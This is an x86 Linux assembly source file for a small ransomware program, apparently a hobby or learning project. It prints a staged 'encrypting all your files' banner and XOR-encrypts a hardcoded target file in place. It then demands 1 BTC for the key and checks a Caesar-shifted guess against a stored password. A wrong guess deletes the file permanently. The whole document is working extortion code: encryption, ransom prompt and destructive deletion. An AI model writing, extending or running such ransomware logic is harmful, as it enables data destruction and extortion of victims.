section .data
    Encryption_Progress db "+----------------------------------------------------------+", 13, 10,
    					db "| [**]           DEVELOPED BY: TheLeopard65           [**] |", 13, 10,
		    			db "+----------------------------------------------------------+", 13, 10,
    					db "| [!] ALERT: ENCRYPTING ALL YOUR FILES !!!                 |", 13, 10,
    					db "| [+] TASK-PROGRESS: 20%   (1.Starting Quantum Computers)  |", 13, 10,
		    			db "| [+] TASK-PROGRESS: 40%   (2.Calculating Files Hashes)    |", 13, 10,
    					db "| [+] TASK-PROGRESS: 60%   (3.Finding your Personal Files) |", 13, 10,
    					db "| [+] TASK-PROGRESS: 80%   (4.Starting Encryption Process) |", 13, 10,
		    			db "| [+] TASK-COMPLETE: 100%  (5.Encrypting your Secret File) |", 13, 10,
    					db "+----------------------------------------------------------+", 13, 10, 0
    Encryption_Progress_len EQU $ - Encryption_Progress
    Decryption_Message db "| [+] INFO: FILE ENCRYPTION HAS BEEN SUCCESSFUL!!          |", 13, 10,
                       db "| [!] SEND ME 1 BTC TO HAVE THE KEY TO DECRYPT YOUR FILES  |", 13, 10,
                       db "| [!] ELSE YOUR FILES WILL BE DELETED PERMANENTLY.         |", 13, 10,
                       db "+----------------------------------------------------------+", 13, 10,
                       db "| [*] INPUT: Enter the Key to Decrypt your Files #: ", 0h
    Decryption_Message_len EQU $ - Decryption_Message
    FileOpenFailedMessage db "| [-] ALERT: Couldn't Open The Target file. LUCKY YOU", 13, 10, 0h
    FileOpenFailedMessageLen EQU $ - FileOpenFailedMessage
    FileReadFailedMessage db "| [-] ALERT: Couldn't Read The Target file. LUCKY YOU", 13, 10, 0h
    FileReadFailedMessageLen EQU $ - FileReadFailedMessage
    FileWriteFailedMessage db "| [-] ALERT: Couldn't Write To Target file. LUCKY YOU", 13, 10, 0h
    FileWriteFailedMessageLen EQU $ - FileWriteFailedMessage
    InputFailedMessage db "| [-] ALERT: Couldn't Take input of the Key Correctly. OOPS!", 13, 10, 0h
    InputFailedMessageLen EQU $ - InputFailedMessage
    Incorrect_key db "+----------------------------------------------------------+", 13, 10,
    		  	  db "| [-] ALERT: INCORRECT KEY. Your Files will be Deleted Now |", 13, 10,
    		  	  db "+----------------------------------------------------------+", 13, 10, 0h
    Incorrect_key_len EQU $ - Incorrect_key
    Correct_Key_Input db "+----------------------------------------------------------+", 13, 10,
    		      	  db "| [+] ALERT: CORRECT KEY. Your Files are being Decrypted!! |", 13, 10, 0h
    Correct_Key_Input_len EQU $ - Correct_Key_Input
    Decryption_Successfull db "+----------------------------------------------------------+", 13, 10,
    			 		   db "| [+] CONGRATS: FILES DECRYPTED SUCCESSFULLY. ENJOY!!      |", 13, 10,
                   		   db "+----------------------------------------------------------+", 13, 10, 0h
    Decryption_Successfull_len EQU $ - Decryption_Successfull
    TargetFile db "./Target-Dir/TargetFile.txt", 0h
    Correct_Key_Value db "Slvwhyk", 0h
    Cipher_Key_Value db 7
    mode dd 00212010h

section .bss
    File_Descripter_Handler resd 1              ; File descripter to hold file indicator
    BytesRead resd 1                            ; Flag to determine if bytes read or not
    BytesWritten resd 1                         ; Flag to determine if bytes written or not
    File_Buffer resb 8192                       ; Buffer to hold file data for processings
    error_code resd 1                           ; Flag to determine if error generated or not
    Key_Guess_Input resb 20                     ; Reserving byte to read Key guess later
    Sleep_Duration resb 8                       ; Nanosleep structure for hacker typing message
    Current_Time resd 1                         ; Reserve 1 DWORD or 4 bytes to store Epoch time

section .text
    global _start                               ; Indicating where to start

_start:
	mov dword [Sleep_Duration], 0               ; Setting seconds = 0
	mov dword [Sleep_Duration+4], 5000000       ; Setting nanoseconds = 5,000,000
	lea esi, [Encryption_Progress]              ; Pointer to message to be printed
	mov edi, Encryption_Progress_len            ; Message length
PRINT_LOOP:
    cmp edi, 0                                  ; Check if characters ended
    je CONTINUE_PROCESSING                      ; If yes, Move to encryption part

    mov eax, 4                                  ; Write system call
    mov ebx, 1                                  ; File descriptor (stdout)
    lea ecx, [esi]                              ; Address of current char
    mov edx, 1                                  ; Length (1 byte) to print 1 character
    int 0x80                                    ; System call

    mov eax, 162                                ; Nanosleep system call for delay
    lea ebx, [Sleep_Duration]                   ; Request structure
    mov ecx, 0                                  ; No remaining time
    int 0x80                                    ; System call

    inc esi                                     ; Mov to next character
    dec edi                                     ; Decrement the loop counter
    jmp PRINT_LOOP                              ; Jump unconditionally print next character

CONTINUE_PROCESSING:
	mov eax, 13                                 ; Time system call
	xor ebx, ebx                                ; Making EBX Zero
	int 0x80                                    ; System call

    mov eax, 5                                  ; Open system call
    mov ebx, TargetFile                         ; Giving absolute file path
    mov ecx, 0                                  ; O_RDONLY (Read Only)
    mov edx, 0                                  ; No special flags
    int 0x80                                    ; System call
    test eax, eax                               ; Check if file open succeeded
    js File_Open_Failed                         ; Jump to error message
    mov [File_Descripter_Handler], eax          ; Store file descriptor

    mov eax, 3                                  ; Read system call
    mov ebx, [File_Descripter_Handler]          ; File descriptor
    lea ecx, [File_Buffer]                      ; Buffer address
    mov edx, 8192                               ; Number of bytes to read
    int 0x80                                    ; System call
    test eax, eax                               ; Check if data was read
    jz File_Read_Failed                         ; Jump to error message
    mov [BytesRead], eax                        ; Store bytes read
    cmp eax, 0                                  ; Check for EOF
    je DONE_ENCRYPTION                          ; If EOF, skip encryption

    mov esi, 0                                  ; Buffer index
    mov ebx, 0x4c494f4e                         ; XOR key
    xor ebx, [Current_Time]                     ; XORing our key with current time
    add ebx, 0x4e4f494c                         ; Adding reverse of our key to the key.

ENCRYPTION_LOOP:
    mov al, byte [File_Buffer + esi]            ; Load BYTE from buffer
    xor al, bl                                  ; XOR Operation
    mov byte [File_Buffer + esi], al            ; Store encrypted BYTE
    inc esi                                     ; Increment buffer index
    cmp esi, [BytesRead]                        ; Check if we've processed all bytes
    jl ENCRYPTION_LOOP                          ; If not, continue

    mov eax, 5                                  ; Open system call
    mov ebx, TargetFile                         ; Giving absolute file path
    mov ecx, 2                                  ; O_RDWR (Read and Write)
    mov edx, 0x2000                             ; O_TRUNC flag (truncate file)
    int 0x80                                    ; System call
    test eax, eax                               ; Check if file open succeeded
    js File_Open_Failed                         ; Jump to error message
    mov [File_Descripter_Handler], eax          ; Store file descriptor

    mov eax, 4                                  ; Write system call
    mov ebx, [File_Descripter_Handler]          ; File descriptor
    lea ecx, [File_Buffer]                      ; Buffer address
    mov edx, [BytesRead]                        ; Number of bytes read
    int 0x80                                    ; System call
    test eax, eax                               ; Check if write was successful
    js File_Write_Failed                        ; Jump to error message
    mov [BytesWritten], eax                     ; Store bytes written

DONE_ENCRYPTION:
    mov eax, 6                                  ; Close system call
    mov ebx, [File_Descripter_Handler]          ; File descriptor
    int 0x80                                    ; System call

DECRYPTION_MESSAGE:
    mov eax, 4                                  ; Write system call
    mov ebx, 1                                  ; File descriptor (stdout)
    mov ecx, Decryption_Message                 ; Decryption message
    mov edx, Decryption_Message_len             ; Message mength
    int 0x80                                    ; System call

    mov eax, 3                                  ; Read system call
    mov ebx, 0                                  ; File descriptor (StdIn)
    mov ecx, Key_Guess_Input                    ; Variable to store to input in
    mov edx, 20                                 ; Size of input to read
    int 0x80                                    ; System call
    test eax, eax                               ; Check if input taken correctly
    jz Input_Failed_Call                        ; Jump to failed input if error

	mov byte [ecx + eax - 1], 0                 ; Null terminating input
	mov esi, Key_Guess_Input                    ; Moving input into ESI

CIPHER_LOOP:
	mov al, [esi]                               ; Load the current character
    cmp al, 0                                   ; Check if we've reached the null terminator
    je Finished_Cipher                          ; Finish cipher if completed
    cmp al, 'A'                                 ; If the character is lower than 'A'
    jl LOWERCASE                                ; It is lowercase, Jump to lowercase processing code
    cmp al, 'Z'                                 ; If the character is greater than 'Z'
    jg LOWERCASE                                ; Handle special symbols in lowercase part as well

    sub al, 'A'                                 ; Start uppercase processing and convert to 0-25 range
    add al, [Cipher_Key_Value]                  ; Apply the cipher shift with the cipher key
    cmp al, 26                                  ; Condition to Check the MOD 26
    jl UPPERCASE_SKIP_MOD_26                    ; Skip MOD 26, if already in range
    sub al, 26                                  ; Else Take MOD 26 of the letter

UPPERCASE_SKIP_MOD_26:
    add al, 'A'                                 ; Convert the letter back to ASCII
    mov [esi], al                               ; Store the encrypted character
    jmp Next_Character                          ; Jump to process next character

LOWERCASE:
    cmp al, 'a'                                 ; If the character is less than 'a'
    jl Next_Character                           ; Skip this symbol and move to next character
    cmp al, 'z'                                 ; If the character is greater than 'z'
    jg Next_Character                           ; Skip this symbol and move to next character

    sub al, 'a'                                 ; Start processing lowercase and convert to 0-25 range
    add al, [Cipher_Key_Value]                  ; Apply the cipher shift with the cipher key
    cmp al, 26                                  ; Condition to check the MOD 26
    jl LOWERCASE_SKIP_MOD_26                    ; Skip MOD 26, if already in range
    sub al, 26                                  ; Else take MOD 26 of the letter

LOWERCASE_SKIP_MOD_26:
    add al, 'a'                                 ; Convert the letter back to ASCII
    mov [esi], al                               ; Store the encrypted character

Next_Character:
	inc esi                                     ; Increment ESI to move to next character
	jmp CIPHER_LOOP                             ; Jump back to continue the loop

Finished_Cipher:
    mov ecx, 7                                  ; Mov 7 in ECX to iterate over 7 letters of the key
    lea esi, [Key_Guess_Input]                  ; Pointer to the user input
    lea edi, [Correct_Key_Value]                ; Pointer to the correct key "Leopard"

Key_Checking_loop:
    mov al, [esi]                               ; Load the current byte from user input
    mov bl, [edi]                               ; Load the current byte from the correct key
    cmp al, bl                                  ; Compare the bytes
    jne INCORRECT_KEY_INPUT                     ; Jump if the characters don't match
    inc esi                                     ; Move to the next byte of the user input
    inc edi                                     ; Move to the next byte of the correct key
    loop Key_Checking_loop                      ; Repeat for all 7 characters
    jmp CORRECT_KEY_INPUT                       ; If all bytes match, jump to decryption section

INCORRECT_KEY_INPUT:
    mov eax, 4                                  ; Write system call
    mov ebx, 1                                  ; File descriptor (stdout)
    mov ecx, Incorrect_key                      ; Incorrect key message
    mov edx, Incorrect_key_len                  ; Message length
    int 0x80                                    ; System call

    mov eax, 10                                 ; Unlink system call (delete file)
    mov ebx, TargetFile                         ; Moving file to be deleted into EBX
    int 0x80                                    ; System call
    jmp ExitProgram                             ; Exit the program

CORRECT_KEY_INPUT:
    mov eax, 4                                  ; Write system call
    mov ebx, 1                                  ; File descriptor (stdout)
    mov ecx, Correct_Key_Input                  ; Correct key message
    mov edx, Correct_Key_Input_len              ; Message length
    int 0x80                                    ; System call

    mov eax, 5                                  ; Open system call
    mov ebx, TargetFile                         ; Giving absolute file path
    mov ecx, 0                                  ; O_RDONLY (Read Only)
    mov edx, 0                                  ; No special flags
    int 0x80                                    ; System call
    test eax, eax                               ; Check if file open succeeded
    js File_Open_Failed                         ; Jump to error message
    mov [File_Descripter_Handler], eax          ; Store file descriptor

    mov eax, 3                                  ; Read system call
    mov ebx, [File_Descripter_Handler]          ; File descriptor
    lea ecx, [File_Buffer]                      ; Buffer address
    mov edx, 8192                               ; Number of bytes to read
    int 0x80                                    ; System call
    test eax, eax                               ; Check if data was read
    jz File_Read_Failed                         ; Jump to error message
    mov [BytesRead], eax                        ; Store bytes read
    cmp eax, 0                                  ; Check for EOF
    je DONE_DECRYPTION                          ; If EOF, skip encryption

    mov esi, 0                                  ; Buffer index
    mov ebx, 0x4c494f4e                         ; XOR key
    xor ebx, [Current_Time]                     ; XORing our key with current time again
    add ebx, 0x4e4f494c                         ; Adding reverse of our key to the key.

DECRYPTION_LOOP:
    mov al, byte [File_Buffer + esi]            ; Load BYTE from buffer
    xor al, bl                                  ; XOR operation
    mov byte [File_Buffer + esi], al            ; Store encrypted BYTE
    inc esi                                     ; Increment buffer index
    cmp esi, [BytesRead]                        ; Check if we've processed all bytes
    jl DECRYPTION_LOOP                          ; If not, continue

    mov eax, 5                                  ; Open system call
    mov ebx, TargetFile                         ; Giving absolute file path
    mov ecx, 2                                  ; O_RDWR (Read and Write)
    mov edx, 0x2000                             ; O_TRUNC flag (truncate file)
    int 0x80                                    ; System call
    test eax, eax                               ; Check if file open succeeded
    js File_Open_Failed                         ; Jump to error message
    mov [File_Descripter_Handler], eax          ; Store file descriptor

    mov eax, 4                                  ; Write system call
    mov ebx, [File_Descripter_Handler]          ; File descriptor
    lea ecx, [File_Buffer]                      ; Buffer address
    mov edx, [BytesRead]                        ; Number of bytes read
    int 0x80                                    ; System call
    test eax, eax                               ; Check if write was successful
    js File_Write_Failed                        ; Jump to error message
    mov [BytesWritten], eax                     ; store bytes written

DONE_DECRYPTION:
    mov eax, 6                                  ; Close system call
    mov ebx, [File_Descripter_Handler]          ; File descriptor
    int 0x80                                    ; System call

    mov eax, 4                                  ; Write system call
    mov ebx, 1                                  ; File descriptor (stdout)
    mov ecx, Decryption_Successfull             ; Success message
    mov edx, Decryption_Successfull_len         ; Message length
    int 0x80                                    ; System call

    jmp ExitProgram                             ; Exit the program

File_Open_Failed:
    mov eax, 4                                  ; Write system call
    mov ebx, 1                                  ; File descriptor (stdout)
    mov ecx, FileOpenFailedMessage              ; File open error message
    mov edx, FileOpenFailedMessageLen           ; Message length
    int 0x80                                    ; System call

    mov [error_code], eax                       ; Save the error code from EAX
    mov eax, 4                                  ; Write system call
    mov ebx, 1                                  ; File descriptor (stdout)
    lea ecx, [error_code]                       ; Error message
    mov edx, 4                                  ; Length of error code
    int 0x80                                    ; System call
    jmp ExitProgram                             ; Exit the program

File_Read_Failed:
    mov eax, 4                                  ; Write system call
    mov ebx, 1                                  ; File descriptor (stdout)
    mov ecx, FileReadFailedMessage              ; File read error message
    mov edx, FileReadFailedMessageLen           ; Message length
    int 0x80                                    ; System call

    mov [error_code], eax                       ; Save the error code from EAX
    mov eax, 4                                  ; Write system call
    mov ebx, 1                                  ; File descriptor (stdout)
    lea ecx, [error_code]                       ; Error message
    mov edx, 4                                  ; Length of error code
    int 0x80                                    ; System call
    jmp ExitProgram                             ; Exit the program

File_Write_Failed:
    mov eax, 4                                  ; Write system call
    mov ebx, 1                                  ; File descriptor (stdout)
    mov ecx, FileWriteFailedMessage             ; File write error message
    mov edx, FileWriteFailedMessageLen          ; Message length
    int 0x80                                    ; System call

    mov [error_code], eax                       ; Save the error code from EAX
    mov eax, 4                                  ; Write system call
    mov ebx, 1                                  ; File descriptor (stdout)
    lea ecx, [error_code]                       ; Error message
    mov edx, 4                                  ; Length of error code
    int 0x80                                    ; System call
    jmp ExitProgram                             ; Exit the program

Input_Failed_Call:
    mov eax, 4                                  ; Write system call
    mov ebx, 1                                  ; File descriptor (stdout)
    mov ecx, InputFailedMessage                 ; Input failure message
    mov edx, InputFailedMessageLen              ; Message length
    int 0x80                                    ; System call

    mov [error_code], eax                       ; Save the error code from EAX
    mov eax, 4                                  ; Write system call
    mov ebx, 1                                  ; File descriptor (stdout)
    lea ecx, [error_code]                       ; Error message
    mov edx, 4                                  ; Length of error code
    int 0x80                                    ; System call
    jmp ExitProgram                             ; Exit the program

ExitProgram:
    mov eax, 1                                  ; Exit system call
    xor ebx, ebx                                ; Setting exit code
    int 0x80                                    ; System call
